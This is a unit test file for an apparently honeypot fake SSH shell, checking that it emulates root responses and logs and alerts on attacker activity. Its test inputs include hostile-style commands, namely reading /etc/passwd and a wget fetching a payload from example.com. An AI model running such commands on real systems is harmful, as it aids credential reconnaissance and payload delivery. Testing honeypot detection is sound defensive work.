import unittest
from unittest.mock import MagicMock, patch
from services.fake_shell import run_shell

class TestFakeShell(unittest.TestCase):
    def setUp(self):
        self.send_mock = MagicMock()
        self.recv_mock = MagicMock()
        self.ip = "1.1.1.1"
        self.port = 22
        self.service = "SSH"
        self.username = "root"

    @patch("services.fake_shell.log_event")
    def test_id_returns_root(self, mock_log):
        self.recv_mock.side_effect = ["id", None]
        run_shell(self.send_mock, self.recv_mock, self.ip, self.port, self.service, self.username)
        
        # Check if root string is in one of the calls
        all_sent = "".join(call.args[0] for call in self.send_mock.call_args_list)
        self.assertIn("uid=0(root)", all_sent)

    @patch("services.fake_shell.log_event")
    def test_cat_passwd(self, mock_log):
        self.recv_mock.side_effect = ["cat /etc/passwd", None]
        run_shell(self.send_mock, self.recv_mock, self.ip, self.port, self.service, self.username)
        
        all_sent = "".join(call.args[0] for call in self.send_mock.call_args_list)
        self.assertIn("root:x:0:0:root", all_sent)

    @patch("services.fake_shell.log_event")
    def test_cd_pwd(self, mock_log):
        self.recv_mock.side_effect = ["cd /", "pwd", None]
        run_shell(self.send_mock, self.recv_mock, self.ip, self.port, self.service, self.username)
        
        all_sent = "".join(call.args[0] for call in self.send_mock.call_args_list)
        self.assertIn("/\r\n", all_sent)

    @patch("services.fake_shell.log_event")
    @patch("services.fake_shell.send_alert")
    def test_wget_logs_download_attempt(self, mock_alert, mock_log):
        self.recv_mock.side_effect = ["wget http://example.com/payload", None]
        run_shell(self.send_mock, self.recv_mock, self.ip, self.port, self.service, self.username)
        
        # Should log download_attempt
        mock_log.assert_any_call(self.ip, self.port, self.service, "download_attempt", unittest.mock.ANY)
        mock_alert.assert_called_with(self.service, self.ip, unittest.mock.ANY, alert_type="download_attempt")

    @patch("services.fake_shell.log_event")
    def test_exit_ends_session(self, mock_log):
        self.recv_mock.side_effect = ["exit", "id"] # id should not be reached
        run_shell(self.send_mock, self.recv_mock, self.ip, self.port, self.service, self.username)
        
        self.assertEqual(self.recv_mock.call_count, 1)

if __name__ == "__main__":
    unittest.main()
